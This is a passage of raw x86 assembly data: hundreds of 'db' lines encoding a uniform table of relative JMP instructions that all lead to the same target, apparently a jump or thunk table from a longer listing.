    db 00h,00h,0E9h,0B8h,0B8h,00h,00h,0E9h,0B3h,0B8h,00h,00h,0E9h,0AEh,0B8h,00h
    db 00h,0E9h,0A9h,0B8h,00h,00h,0E9h,0A4h,0B8h,00h,00h,0E9h,9Fh,0B8h,00h,00h
    db 0E9h,9Ah,0B8h,00h,00h,0E9h,95h,0B8h,00h,00h,0E9h,90h,0B8h,00h,00h,0E9h
    db 8Bh,0B8h,00h,00h,0E9h,86h,0B8h,00h,00h,0E9h,81h,0B8h,00h,00h,0E9h,7Ch
    db 0B8h,00h,00h,0E9h,77h,0B8h,00h,00h,0E9h,72h,0B8h,00h,00h,0E9h,6Dh,0B8h
    db 00h,00h,0E9h,68h,0B8h,00h,00h,0E9h,63h,0B8h,00h,00h,0E9h,5Eh,0B8h,00h
    db 00h,0E9h,59h,0B8h,00h,00h,0E9h,54h,0B8h,00h,00h,0E9h,4Fh,0B8h,00h,00h
    db 0E9h,4Ah,0B8h,00h,00h,0E9h,45h,0B8h,00h,00h,0E9h,40h,0B8h,00h,00h,0E9h
    db 3Bh,0B8h,00h,00h,0E9h,36h,0B8h,00h,00h,0E9h,31h,0B8h,00h,00h,0E9h,2Ch
    db 0B8h,00h,00h,0E9h,27h,0B8h,00h,00h,0E9h,22h,0B8h,00h,00h,0E9h,1Dh,0B8h
    db 00h,00h,0E9h,18h,0B8h,00h,00h,0E9h,13h,0B8h,00h,00h,0E9h,0Eh,0B8h,00h
    db 00h,0E9h,09h,0B8h,00h,00h,0E9h,04h,0B8h,00h,00h,0E9h,0FFh,0B7h,00h,00h
    db 0E9h,0FAh,0B7h,00h,00h,0E9h,0F5h,0B7h,00h,00h,0E9h,0F0h,0B7h,00h,00h,0E9h
    db 0EBh,0B7h,00h,00h,0E9h,0E6h,0B7h,00h,00h,0E9h,0E1h,0B7h,00h,00h,0E9h,0DCh
    db 0B7h,00h,00h,0E9h,0D7h,0B7h,00h,00h,0E9h,0D2h,0B7h,00h,00h,0E9h,0CDh,0B7h
    db 00h,00h,0E9h,0C8h,0B7h,00h,00h,0E9h,0C3h,0B7h,00h,00h,0E9h,0BEh,0B7h,00h
    db 00h,0E9h,0B9h,0B7h,00h,00h,0E9h,0B4h,0B7h,00h,00h,0E9h,0AFh,0B7h,00h,00h
    db 0E9h,0AAh,0B7h,00h,00h,0E9h,0A5h,0B7h,00h,00h,0E9h,0A0h,0B7h,00h,00h,0E9h
    db 9Bh,0B7h,00h,00h,0E9h,96h,0B7h,00h,00h,0E9h,91h,0B7h,00h,00h,0E9h,8Ch
    db 0B7h,00h,00h,0E9h,87h,0B7h,00h,00h,0E9h,82h,0B7h,00h,00h,0E9h,7Dh,0B7h
    db 00h,00h,0E9h,78h,0B7h,00h,00h,0E9h,73h,0B7h,00h,00h,0E9h,6Eh,0B7h,00h
    db 00h,0E9h,69h,0B7h,00h,00h,0E9h,64h,0B7h,00h,00h,0E9h,5Fh,0B7h,00h,00h
    db 0E9h,5Ah,0B7h,00h,00h,0E9h,55h,0B7h,00h,00h,0E9h,50h,0B7h,00h,00h,0E9h
    db 4Bh,0B7h,00h,00h,0E9h,46h,0B7h,00h,00h,0E9h,41h,0B7h,00h,00h,0E9h,3Ch
    db 0B7h,00h,00h,0E9h,37h,0B7h,00h,00h,0E9h,32h,0B7h,00h,00h,0E9h,2Dh,0B7h
    db 00h,00h,0E9h,28h,0B7h,00h,00h,0E9h,23h,0B7h,00h,00h,0E9h,1Eh,0B7h,00h
    db 00h,0E9h,19h,0B7h,00h,00h,0E9h,14h,0B7h,00h,00h,0E9h,0Fh,0B7h,00h,00h
    db 0E9h,0Ah,0B7h,00h,00h,0E9h,05h,0B7h,00h,00h,0E9h,00h,0B7h,00h,00h,0E9h
    db 0FBh,0B6h,00h,00h,0E9h,0F6h,0B6h,00h,00h,0E9h,0F1h,0B6h,00h,00h,0E9h,0ECh
    db 0B6h,00h,00h,0E9h,0E7h,0B6h,00h,00h,0E9h,0E2h,0B6h,00h,00h,0E9h,0DDh,0B6h
    db 00h,00h,0E9h,0D8h,0B6h,00h,00h,0E9h,0D3h,0B6h,00h,00h,0E9h,0CEh,0B6h,00h
    db 00h,0E9h,0C9h,0B6h,00h,00h,0E9h,0C4h,0B6h,00h,00h,0E9h,0BFh,0B6h,00h,00h
    db 0E9h,0BAh,0B6h,00h,00h,0E9h,0B5h,0B6h,00h,00h,0E9h,0B0h,0B6h,00h,00h,0E9h
    db 0ABh,0B6h,00h,00h,0E9h,0A6h,0B6h,00h,00h,0E9h,0A1h,0B6h,00h,00h,0E9h,9Ch
    db 0B6h,00h,00h,0E9h,97h,0B6h,00h,00h,0E9h,92h,0B6h,00h,00h,0E9h,8Dh,0B6h
    db 00h,00h,0E9h,88h,0B6h,00h,00h,0E9h,83h,0B6h,00h,00h,0E9h,7Eh,0B6h,00h
    db 00h,0E9h,79h,0B6h,00h,00h,0E9h,74h,0B6h,00h,00h,0E9h,6Fh,0B6h,00h,00h
    db 0E9h,6Ah,0B6h,00h,00h,0E9h,65h,0B6h,00h,00h,0E9h,60h,0B6h,00h,00h,0E9h
    db 5Bh,0B6h,00h,00h,0E9h,56h,0B6h,00h,00h,0E9h,51h,0B6h,00h,00h,0E9h,4Ch
    db 0B6h,00h,00h,0E9h,47h,0B6h,00h,00h,0E9h,42h,0B6h,00h,00h,0E9h,3Dh,0B6h
    db 00h,00h,0E9h,38h,0B6h,00h,00h,0E9h,33h,0B6h,00h,00h,0E9h,2Eh,0B6h,00h
    db 00h,0E9h,29h,0B6h,00h,00h,0E9h,24h,0B6h,00h,00h,0E9h,1Fh,0B6h,00h,00h
    db 0E9h,1Ah,0B6h,00h,00h,0E9h,15h,0B6h,00h,00h,0E9h,10h,0B6h,00h,00h,0E9h
    db 0Bh,0B6h,00h,00h,0E9h,06h,0B6h,00h,00h,0E9h,01h,0B6h,00h,00h,0E9h,0FCh
    db 0B5h,00h,00h,0E9h,0F7h,0B5h,00h,00h,0E9h,0F2h,0B5h,00h,00h,0E9h,0EDh,0B5h
    db 00h,00h,0E9h,0E8h,0B5h,00h,00h,0E9h,0E3h,0B5h,00h,00h,0E9h,0DEh,0B5h,00h
    db 00h,0E9h,0D9h,0B5h,00h,00h,0E9h,0D4h,0B5h,00h,00h,0E9h,0CFh,0B5h,00h,00h
    db 0E9h,0CAh,0B5h,00h,00h,0E9h,0C5h,0B5h,00h,00h,0E9h,0C0h,0B5h,00h,00h,0E9h
    db 0BBh,0B5h,00h,00h,0E9h,0B6h,0B5h,00h,00h,0E9h,0B1h,0B5h,00h,00h,0E9h,0ACh
    db 0B5h,00h,00h,0E9h,0A7h,0B5h,00h,00h,0E9h,0A2h,0B5h,00h,00h,0E9h,9Dh,0B5h
    db 00h,00h,0E9h,98h,0B5h,00h,00h,0E9h,93h,0B5h,00h,00h,0E9h,8Eh,0B5h,00h
    db 00h,0E9h,89h,0B5h,00h,00h,0E9h,84h,0B5h,00h,00h,0E9h,7Fh,0B5h,00h,00h
    db 0E9h,7Ah,0B5h,00h,00h,0E9h,75h,0B5h,00h,00h,0E9h,70h,0B5h,00h,00h,0E9h
    db 6Bh,0B5h,00h,00h,0E9h,66h,0B5h,00h,00h,0E9h,61h,0B5h,00h,00h,0E9h,5Ch
    db 0B5h,00h,00h,0E9h,57h,0B5h,00h,00h,0E9h,52h,0B5h,00h,00h,0E9h,4Dh,0B5h
    db 00h,00h,0E9h,48h,0B5h,00h,00h,0E9h,43h,0B5h,00h,00h,0E9h,3Eh,0B5h,00h
    db 00h,0E9h,39h,0B5h,00h,00h,0E9h,34h,0B5h,00h,00h,0E9h,2Fh,0B5h,00h,00h
    db 0E9h,2Ah,0B5h,00h,00h,0E9h,25h,0B5h,00h,00h,0E9h,20h,0B5h,00h,00h,0E9h
    db 1Bh,0B5h,00h,00h,0E9h,16h,0B5h,00h,00h,0E9h,11h,0B5h,00h,00h,0E9h,0Ch
    db 0B5h,00h,00h,0E9h,07h,0B5h,00h,00h,0E9h,02h,0B5h,00h,00h,0E9h,0FDh,0B4h
    db 00h,00h,0E9h,0F8h,0B4h,00h,00h,0E9h,0F3h,0B4h,00h,00h,0E9h,0EEh,0B4h,00h
    db 00h,0E9h,0E9h,0B4h,00h,00h,0E9h,0E4h,0B4h,00h,00h,0E9h,0DFh,0B4h,00h,00h
    db 0E9h,0DAh,0B4h,00h,00h,0E9h,0D5h,0B4h,00h,00h,0E9h,0D0h,0B4h,00h,00h,0E9h
    db 0CBh,0B4h,00h,00h,0E9h,0C6h,0B4h,00h,00h,0E9h,0C1h,0B4h,00h,00h,0E9h,0BCh
    db 0B4h,00h,00h,0E9h,0B7h,0B4h,00h,00h,0E9h,0B2h,0B4h,00h,00h,0E9h,0ADh,0B4h
    db 00h,00h,0E9h,0A8h,0B4h,00h,00h,0E9h,0A3h,0B4h,00h,00h,0E9h,9Eh,0B4h,00h
    db 00h,0E9h,99h,0B4h,00h,00h,0E9h,94h,0B4h,00h,00h,0E9h,8Fh,0B4h,00h,00h
    db 0E9h,8Ah,0B4h,00h,00h,0E9h,85h,0B4h,00h,00h,0E9h,80h,0B4h,00h,00h,0E9h
    db 7Bh,0B4h,00h,00h,0E9h,76h,0B4h,00h,00h,0E9h,71h,0B4h,00h,00h,0E9h,6Ch
    db 0B4h,00h,00h,0E9h,67h,0B4h,00h,00h,0E9h,62h,0B4h,00h,00h,0E9h,5Dh,0B4h
    db 00h,00h,0E9h,58h,0B4h,00h,00h,0E9h,53h,0B4h,00h,00h,0E9h,4Eh,0B4h,00h
    db 00h,0E9h,49h,0B4h,00h,00h,0E9h,44h,0B4h,00h,00h,0E9h,3Fh,0B4h,00h,00h
    db 0E9h,3Ah,0B4h,00h,00h,0E9h,35h,0B4h,00h,00h,0E9h,30h,0B4h,00h,00h,0E9h
    db 2Bh,0B4h,00h,00h,0E9h,26h,0B4h,00h,00h,0E9h,21h,0B4h,00h,00h,0E9h,1Ch
    db 0B4h,00h,00h,0E9h,17h,0B4h,00h,00h,0E9h,12h,0B4h,00h,00h,0E9h,0Dh,0B4h
    db 00h,00h,0E9h,08h,0B4h,00h,00h,0E9h,03h,0B4h,00h,00h,0E9h,0FEh,0B3h,00h
    db 00h,0E9h,0F9h,0B3h,00h,00h,0E9h,0F4h,0B3h,00h,00h,0E9h,0EFh,0B3h,00h,00h
    db 0E9h,0EAh,0B3h,00h,00h,0E9h,0E5h,0B3h,00h,00h,0E9h,0E0h,0B3h,00h,00h,0E9h
    db 0DBh,0B3h,00h,00h,0E9h,0D6h,0B3h,00h,00h,0E9h,0D1h,0B3h,00h,00h,0E9h,0CCh
    db 0B3h,00h,00h,0E9h,0C7h,0B3h,00h,00h,0E9h,0C2h,0B3h,00h,00h,0E9h,0BDh,0B3h
    db 00h,00h,0E9h,0B8h,0B3h,00h,00h,0E9h,0B3h,0B3h,00h,00h,0E9h,0AEh,0B3h,00h
    db 00h,0E9h,0A9h,0B3h,00h,00h,0E9h,0A4h,0B3h,00h,00h,0E9h,9Fh,0B3h,00h,00h
    db 0E9h,9Ah,0B3h,00h,00h,0E9h,95h,0B3h,00h,00h,0E9h,90h,0B3h,00h,00h,0E9h
    db 8Bh,0B3h,00h,00h,0E9h,86h,0B3h,00h,00h,0E9h,81h,0B3h,00h,00h,0E9h,7Ch
    db 0B3h,00h,00h,0E9h,77h,0B3h,00h,00h,0E9h,72h,0B3h,00h,00h,0E9h,6Dh,0B3h
    db 00h,00h,0E9h,68h,0B3h,00h,00h,0E9h,63h,0B3h,00h,00h,0E9h,5Eh,0B3h,00h
    db 00h,0E9h,59h,0B3h,00h,00h,0E9h,54h,0B3h,00h,00h,0E9h,4Fh,0B3h,00h,00h
    db 0E9h,4Ah,0B3h,00h,00h,0E9h,45h,0B3h,00h,00h,0E9h,40h,0B3h,00h,00h,0E9h
    db 3Bh,0B3h,00h,00h,0E9h,36h,0B3h,00h,00h,0E9h,31h,0B3h,00h,00h,0E9h,2Ch
    db 0B3h,00h,00h,0E9h,27h,0B3h,00h,00h,0E9h,22h,0B3h,00h,00h,0E9h,1Dh,0B3h
    db 00h,00h,0E9h,18h,0B3h,00h,00h,0E9h,13h,0B3h,00h,00h,0E9h,0Eh,0B3h,00h
    db 00h,0E9h,09h,0B3h,00h,00h,0E9h,04h,0B3h,00h,00h,0E9h,0FFh,0B2h,00h,00h
    db 0E9h,0FAh,0B2h,00h,00h,0E9h,0F5h,0B2h,00h,00h,0E9h,0F0h,0B2h,00h,00h,0E9h
    db 0EBh,0B2h,00h,00h,0E9h,0E6h,0B2h,00h,00h,0E9h,0E1h,0B2h,00h,00h,0E9h,0DCh
    db 0B2h,00h,00h,0E9h,0D7h,0B2h,00h,00h,0E9h,0D2h,0B2h,00h,00h,0E9h,0CDh,0B2h
    db 00h,00h,0E9h,0C8h,0B2h,00h,00h,0E9h,0C3h,0B2h,00h,00h,0E9h,0BEh,0B2h,00h
    db 00h,0E9h,0B9h,0B2h,00h,00h,0E9h,0B4h,0B2h,00h,00h,0E9h,0AFh,0B2h,00h,00h
    db 0E9h,0AAh,0B2h,00h,00h,0E9h,0A5h,0B2h,00h,00h,0E9h,0A0h,0B2h,00h,00h,0E9h
    db 9Bh,0B2h,00h,00h,0E9h,96h,0B2h,00h,00h,0E9h,91h,0B2h,00h,00h,0E9h,8Ch
    db 0B2h,00h,00h,0E9h,87h,0B2h,00h,00h,0E9h,82h,0B2h,00h,00h,0E9h,7Dh,0B2h
    db 00h,00h,0E9h,78h,0B2h,00h,00h,0E9h,73h,0B2h,00h,00h,0E9h,6Eh,0B2h,00h
    db 00h,0E9h,69h,0B2h,00h,00h,0E9h,64h,0B2h,00h,00h,0E9h,5Fh,0B2h,00h,00h
    db 0E9h,5Ah,0B2h,00h,00h,0E9h,55h,0B2h,00h,00h,0E9h,50h,0B2h,00h,00h,0E9h
    db 4Bh,0B2h,00h,00h,0E9h,46h,0B2h,00h,00h,0E9h,41h,0B2h,00h,00h,0E9h,3Ch
    db 0B2h,00h,00h,0E9h,37h,0B2h,00h,00h,0E9h,32h,0B2h,00h,00h,0E9h,2Dh,0B2h
    db 00h,00h,0E9h,28h,0B2h,00h,00h,0E9h,23h,0B2h,00h,00h,0E9h,1Eh,0B2h,00h
    db 00h,0E9h,19h,0B2h,00h,00h,0E9h,14h,0B2h,00h,00h,0E9h,0Fh,0B2h,00h,00h
    db 0E9h,0Ah,0B2h,00h,00h,0E9h,05h,0B2h,00h,00h,0E9h,00h,0B2h,00h,00h,0E9h
    db 0FBh,0B1h,00h,00h,0E9h,0F6h,0B1h,00h,00h,0E9h,0F1h,0B1h,00h,00h,0E9h,0ECh
    db 0B1h,00h,00h,0E9h,0E7h,0B1h,00h,00h,0E9h,0E2h,0B1h,00h,00h,0E9h,0DDh,0B1h
    db 00h,00h,0E9h,0D8h,0B1h,00h,00h,0E9h,0D3h,0B1h,00h,00h,0E9h,0CEh,0B1h,00h
    db 00h,0E9h,0C9h,0B1h,00h,00h,0E9h,0C4h,0B1h,00h,00h,0E9h,0BFh,0B1h,00h,00h
    db 0E9h,0BAh,0B1h,00h,00h,0E9h,0B5h,0B1h,00h,00h,0E9h,0B0h,0B1h,00h,00h,0E9h
    db 0ABh,0B1h,00h,00h,0E9h,0A6h,0B1h,00h,00h,0E9h,0A1h,0B1h,00h,00h,0E9h,9Ch
    db 0B1h,00h,00h,0E9h,97h,0B1h,00h,00h,0E9h,92h,0B1h,00h,00h,0E9h,8Dh,0B1h
    db 00h,00h,0E9h,88h,0B1h,00h,00h,0E9h,83h,0B1h,00h,00h,0E9h,7Eh,0B1h,00h
    db 00h,0E9h,79h,0B1h,00h,00h,0E9h,74h,0B1h,00h,00h,0E9h,6Fh,0B1h,00h,00h
    db 0E9h,6Ah,0B1h,00h,00h,0E9h,65h,0B1h,00h,00h,0E9h,60h,0B1h,00h,00h,0E9h
    db 5Bh,0B1h,00h,00h,0E9h,56h,0B1h,00h,00h,0E9h,51h,0B1h,00h,00h,0E9h,4Ch
    db 0B1h,00h,00h,0E9h,47h,0B1h,00h,00h,0E9h,42h,0B1h,00h,00h,0E9h,3Dh,0B1h
    db 00h,00h,0E9h,38h,0B1h,00h,00h,0E9h,33h,0B1h,00h,00h,0E9h,2Eh,0B1h,00h
    db 00h,0E9h,29h,0B1h,00h,00h,0E9h,24h,0B1h,00h,00h,0E9h,1Fh,0B1h,00h,00h
    db 0E9h,1Ah,0B1h,00h,00h,0E9h,15h,0B1h,00h,00h,0E9h,10h,0B1h,00h,00h,0E9h
    db 0Bh,0B1h,00h,00h,0E9h,06h,0B1h,00h,00h,0E9h,01h,0B1h,00h,00h,0E9h,0FCh
    db 0B0h,00h,00h,0E9h,0F7h,0B0h,00h,00h,0E9h,0F2h,0B0h,00h,00h,0E9h,0EDh,0B0h
    db 00h,00h,0E9h,0E8h,0B0h,00h,00h,0E9h,0E3h,0B0h,00h,00h,0E9h,0DEh,0B0h,00h
    db 00h,0E9h,0D9h,0B0h,00h,00h,0E9h,0D4h,0B0h,00h,00h,0E9h,0CFh,0B0h,00h,00h
    db 0E9h,0CAh,0B0h,00h,00h,0E9h,0C5h,0B0h,00h,00h,0E9h,0C0h,0B0h,00h,00h,0E9h
    db 0BBh,0B0h,00h,00h,0E9h,0B6h,0B0h,00h,00h,0E9h,0B1h,0B0h,00h,00h,0E9h,0ACh
    db 0B0h,00h,00h,0E9h,0A7h,0B0h,00h,00h,0E9h,0A2h,0B0h,00h,00h,0E9h,9Dh,0B0h
    db 00h,00h,0E9h,98h,0B0h,00h,00h,0E9h,93h,0B0h,00h,00h,0E9h,8Eh,0B0h,00h
    db 00h,0E9h,89h,0B0h,00h,00h,0E9h,84h,0B0h,00h,00h,0E9h,7Fh,0B0h,00h,00h
    db 0E9h,7Ah,0B0h,00h,00h,0E9h,75h,0B0h,00h,00h,0E9h,70h,0B0h,00h,00h,0E9h
    db 6Bh,0B0h,00h,00h,0E9h,66h,0B0h,00h,00h,0E9h,61h,0B0h,00h,00h,0E9h,5Ch
    db 0B0h,00h,00h,0E9h,57h,0B0h,00h,00h,0E9h,52h,0B0h,00h,00h,0E9h,4Dh,0B0h
    db 00h,00h,0E9h,48h,0B0h,00h,00h,0E9h,43h,0B0h,00h,00h,0E9h,3Eh,0B0h,00h
    db 00h,0E9h,39h,0B0h,00h,00h,0E9h,34h,0B0h,00h,00h,0E9h,2Fh,0B0h,00h,00h
    db 0E9h,2Ah,0B0h,00h,00h,0E9h,25h,0B0h,00h,00h,0E9h,20h,0B0h,00h,00h,0E9h
    db 1Bh,0B0h,00h,00h,0E9h,16h,0B0h,00h,00h,0E9h,11h,0B0h,00h,00h,0E9h,0Ch
    db 0B0h,00h,00h,0E9h,07h,0B0h,00h,00h,0E9h,02h,0B0h,00h,00h,0E9h,0FDh,0AFh
    db 00h,00h,0E9h,0F8h,0AFh,00h,00h,0E9h,0F3h,0AFh,00h,00h,0E9h,0EEh,0AFh,00h
    db 00h,0E9h,0E9h,0AFh,00h,00h,0E9h,0E4h,0AFh,00h,00h,0E9h,0DFh,0AFh,00h,00h
    db 0E9h,0DAh,0AFh,00h,00h,0E9h,0D5h,0AFh,00h,00h,0E9h,0D0h,0AFh,00h,00h,0E9h
    db 0CBh,0AFh,00h,00h,0E9h,0C6h,0AFh,00h,00h,0E9h,0C1h,0AFh,00h,00h,0E9h,0BCh
    db 0AFh,00h,00h,0E9h,0B7h,0AFh,00h,00h,0E9h,0B2h,0AFh,00h,00h,0E9h,0ADh,0AFh
    db 00h,00h,0E9h,0A8h,0AFh,00h,00h,0E9h,0A3h,0AFh,00h,00h,0E9h,9Eh,0AFh,00h
    db 00h,0E9h,99h,0AFh,00h,00h,0E9h,94h,0AFh,00h,00h,0E9h,8Fh,0AFh,00h,00h
    db 0E9h,8Ah,0AFh,00h,00h,0E9h,85h,0AFh,00h,00h,0E9h,80h,0AFh,00h,00h,0E9h
    db 7Bh,0AFh,00h,00h,0E9h,76h,0AFh,00h,00h,0E9h,71h,0AFh,00h,00h,0E9h,6Ch
    db 0AFh,00h,00h,0E9h,67h,0AFh,00h,00h,0E9h,62h,0AFh,00h,00h,0E9h,5Dh,0AFh
    db 00h,00h,0E9h,58h,0AFh,00h,00h,0E9h,53h,0AFh,00h,00h,0E9h,4Eh,0AFh,00h
    db 00h,0E9h,49h,0AFh,00h,00h,0E9h,44h,0AFh,00h,00h,0E9h,3Fh,0AFh,00h,00h
    db 0E9h,3Ah,0AFh,00h,00h,0E9h,35h,0AFh,00h,00h,0E9h,30h,0AFh,00h,00h,0E9h
    db 2Bh,0AFh,00h,00h,0E9h,26h,0AFh,00h,00h,0E9h,21h,0AFh,00h,00h,0E9h,1Ch
    db 0AFh,00h,00h,0E9h,17h,0AFh,00h,00h,0E9h,12h,0AFh,00h,00h,0E9h,0Dh,0AFh
    db 00h,00h,0E9h,08h,0AFh,00h,00h,0E9h,03h,0AFh,00h,00h,0E9h,0FEh,0AEh,00h
    db 00h,0E9h,0F9h,0AEh,00h,00h,0E9h,0F4h,0AEh,00h,00h,0E9h,0EFh,0AEh,00h,00h
    db 0E9h,0EAh,0AEh,00h,00h,0E9h,0E5h,0AEh,00h,00h,0E9h,0E0h,0AEh,00h,00h,0E9h
    db 0DBh,0AEh,00h,00h,0E9h,0D6h,0AEh,00h,00h,0E9h,0D1h,0AEh,00h,00h,0E9h,0CCh
    db 0AEh,00h,00h,0E9h,0C7h,0AEh,00h,00h,0E9h,0C2h,0AEh,00h,00h,0E9h,0BDh,0AEh
    db 00h,00h,0E9h,0B8h,0AEh,00h,00h,0E9h,0B3h,0AEh,00h,00h,0E9h,0AEh,0AEh,00h
    db 00h,0E9h,0A9h,0AEh,00h,00h,0E9h,0A4h,0AEh,00h,00h,0E9h,9Fh,0AEh,00h,00h
    db 0E9h,9Ah,0AEh,00h,00h,0E9h,95h,0AEh,00h,00h,0E9h,90h,0AEh,00h,00h,0E9h
    db 8Bh,0AEh,00h,00h,0E9h,86h,0AEh,00h,00h,0E9h,81h,0AEh,00h,00h,0E9h,7Ch
    db 0AEh,00h,00h,0E9h,77h,0AEh,00h,00h,0E9h,72h,0AEh,00h,00h,0E9h,6Dh,0AEh
    db 00h,00h,0E9h,68h,0AEh,00h,00h,0E9h,63h,0AEh,00h,00h,0E9h,5Eh,0AEh,00h
    db 00h,0E9h,59h,0AEh,00h,00h,0E9h,54h,0AEh,00h,00h,0E9h,4Fh,0AEh,00h,00h
    db 0E9h,4Ah,0AEh,00h,00h,0E9h,45h,0AEh,00h,00h,0E9h,40h,0AEh,00h,00h,0E9h
    db 3Bh,0AEh,00h,00h,0E9h,36h,0AEh,00h,00h,0E9h,31h,0AEh,00h,00h,0E9h,2Ch
    db 0AEh,00h,00h,0E9h,27h,0AEh,00h,00h,0E9h,22h,0AEh,00h,00h,0E9h,1Dh,0AEh
    db 00h,00h,0E9h,18h,0AEh,00h,00h,0E9h,13h,0AEh,00h,00h,0E9h,0Eh,0AEh,00h
    db 00h,0E9h,09h,0AEh,00h,00h,0E9h,04h,0AEh,00h,00h,0E9h,0FFh,0ADh,00h,00h
    db 0E9h,0FAh,0ADh,00h,00h,0E9h,0F5h,0ADh,00h,00h,0E9h,0F0h,0ADh,00h,00h,0E9h
    db 0EBh,0ADh,00h,00h,0E9h,0E6h,0ADh,00h,00h,0E9h,0E1h,0ADh,00h,00h,0E9h,0DCh
    db 0ADh,00h,00h,0E9h,0D7h,0ADh,00h,00h,0E9h,0D2h,0ADh,00h,00h,0E9h,0CDh,0ADh
    db 00h,00h,0E9h,0C8h,0ADh,00h,00h,0E9h,0C3h,0ADh,00h,00h,0E9h,0BEh,0ADh,00h
    db 00h,0E9h,0B9h,0ADh,00h,00h,0E9h,0B4h,0ADh,00h,00h,0E9h,0AFh,0ADh,00h,00h
    db 0E9h,0AAh,0ADh,00h,00h,0E9h,0A5h,0ADh,00h,00h,0E9h,0A0h,0ADh,00h,00h,0E9h
    db 9Bh,0ADh,00h,00h,0E9h,96h,0ADh,00h,00h,0E9h,91h,0ADh,00h,00h,0E9h,8Ch
    db 0ADh,00h,00h,0E9h,87h,0ADh,00h,00h,0E9h,82h,0ADh,00h,00h,0E9h,7Dh,0ADh
    db 00h,00h,0E9h,78h,0ADh,00h,00h,0E9h,73h,0ADh,00h,00h,0E9h,6Eh,0ADh,00h
    db 00h,0E9h,69h,0ADh,00h,00h,0E9h,64h,0ADh,00h,00h,0E9h,5Fh,0ADh,00h,00h
    db 0E9h,5Ah,0ADh,00h,00h,0E9h,55h,0ADh,00h,00h,0E9h,50h,0ADh,00h,00h,0E9h
    db 4Bh,0ADh,00h,00h,0E9h,46h,0ADh,00h,00h,0E9h,41h,0ADh,00h,00h,0E9h,3Ch
    db 0ADh,00h,00h,0E9h,37h,0ADh,00h,00h,0E9h,32h,0ADh,00h,00h,0E9h,2Dh,0ADh
    db 00h,00h,0E9h,28h,0ADh,00h,00h,0E9h,23h,0ADh,00h,00h,0E9h,1Eh,0ADh,00h
    db 00h,0E9h,19h,0ADh,00h,00h,0E9h,14h,0ADh,00h,00h,0E9h,0Fh,0ADh,00h,00h
    db 0E9h,0Ah,0ADh,00h,00h,0E9h,05h,0ADh,00h,00h,0E9h,00h,0ADh,00h,00h,0E9h
    db 0FBh,0ACh,00h,00h,0E9h,0F6h,0ACh,00h,00h,0E9h,0F1h,0ACh,00h,00h,0E9h,0ECh
    db 0ACh,00h,00h,0E9h,0E7h,0ACh,00h,00h,0E9h,0E2h,0ACh,00h,00h,0E9h,0DDh,0ACh
    db 00h,00h,0E9h,0D8h,0ACh,00h,00h,0E9h,0D3h,0ACh,00h,00h,0E9h,0CEh,0ACh,00h
    db 00h,0E9h,0C9h,0ACh,00h,00h,0E9h,0C4h,0ACh,00h,00h,0E9h,0BFh,0ACh,00h,00h
    db 0E9h,0BAh,0ACh,00h,00h,0E9h,0B5h,0ACh,00h,00h,0E9h,0B0h,0ACh,00h,00h,0E9h
    db 0ABh,0ACh,00h,00h,0E9h,0A6h,0ACh,00h,00h,0E9h,0A1h,0ACh,00h,00h,0E9h,9Ch
    db 0ACh,00h,00h,0E9h,97h,0ACh,00h,00h,0E9h,92h,0ACh,00h,00h,0E9h,8Dh,0ACh
    db 00h,00h,0E9h,88h,0ACh,00h,00h,0E9h,83h,0ACh,00h,00h,0E9h,7Eh,0ACh,00h
    db 00h,0E9h,79h,0ACh,00h,00h,0E9h,74h,0ACh,00h,00h,0E9h,6Fh,0ACh,00h,00h
    db 0E9h,6Ah,0ACh,00h,00h,0E9h,65h,0ACh,00h,00h,0E9h,60h,0ACh,00h,00h,0E9h
    db 5Bh,0ACh,00h,00h,0E9h,56h,0ACh,00h,00h,0E9h,51h,0ACh,00h,00h,0E9h,4Ch
    db 0ACh,00h,00h,0E9h,47h,0ACh,00h,00h,0E9h,42h,0ACh,00h,00h,0E9h,3Dh,0ACh
    db 00h,00h,0E9h,38h,0ACh,00h,00h,0E9h,33h,0ACh,00h,00h,0E9h,2Eh,0ACh,00h
    db 00h,0E9h,29h,0ACh,00h,00h,0E9h,24h,0ACh,00h,00h,0E9h,1Fh,0ACh,00h,00h
    db 0E9h,1Ah,0ACh,00h,00h,0E9h,15h,0ACh,00h,00h,0E9h,10h,0ACh,00h,00h,0E9h
    db 0Bh,0ACh,00h,00h,0E9h,06h,0ACh,00h,00h,0E9h,01h,0ACh,00h,00h,0E9h,0FCh
    db 0ABh,00h,00h,0E9h,0F7h,0ABh,00h,00h,0E9h,0F2h,0ABh,00h,00h,0E9h,0EDh,0ABh
    db 00h,00h,0E9h,0E8h,0ABh,00h,00h,0E9h,0E3h,0ABh,00h,00h,0E9h,0DEh,0ABh,00h
    db 00h,0E9h,0D9h,0ABh,00h,00h,0E9h,0D4h,0ABh,00h,00h,0E9h,0CFh,0ABh,00h,00h
    db 0E9h,0CAh,0ABh,00h,00h,0E9h,0C5h,0ABh,00h,00h,0E9h,0C0h,0ABh,00h,00h,0E9h
    db 0BBh,0ABh,00h,00h,0E9h,0B6h,0ABh,00h,00h,0E9h,0B1h,0ABh,00h,00h,0E9h,0ACh
    db 0ABh,00h,00h,0E9h,0A7h,0ABh,00h,00h,0E9h,0A2h,0ABh,00h,00h,0E9h,9Dh,0ABh
    db 00h,00h,0E9h,98h,0ABh,00h,00h,0E9h,93h,0ABh,00h,00h,0E9h,8Eh,0ABh,00h
    db 00h,0E9h,89h,0ABh,00h,00h,0E9h,84h,0ABh,00h,00h,0E9h,7Fh,0ABh,00h,00h
    db 0E9h,7Ah,0ABh,00h,00h,0E9h,75h,0ABh,00h,00h,0E9h,70h,0ABh,00h,00h,0E9h
    db 6Bh,0ABh,00h,00h,0E9h,66h,0ABh,00h,00h,0E9h,61h,0ABh,00h,00h,0E9h,5Ch
    db 0ABh,00h,00h,0E9h,57h,0ABh,00h,00h,0E9h,52h,0ABh,00h,00h,0E9h,4Dh,0ABh
    db 00h,00h,0E9h,48h,0ABh,00h,00h,0E9h,43h,0ABh,00h,00h,0E9h,3Eh,0ABh,00h
    db 00h,0E9h,39h,0ABh,00h,00h,0E9h,34h,0ABh,00h,00h,0E9h,2Fh,0ABh,00h,00h
    db 0E9h,2Ah,0ABh,00h,00h,0E9h,25h,0ABh,00h,00h,0E9h,20h,0ABh,00h,00h,0E9h
    db 1Bh,0ABh,00h,00h,0E9h,16h,0ABh,00h,00h,0E9h,11h,0ABh,00h,00h,0E9h,0Ch
    db 0ABh,00h,00h,0E9h,07h,0ABh,00h,00h,0E9h,02h,0ABh,00h,00h,0E9h,0FDh,0AAh
    db 00h,00h,0E9h,0F8h,0AAh,00h,00h,0E9h,0F3h,0AAh,00h,00h,0E9h,0EEh,0AAh,00h
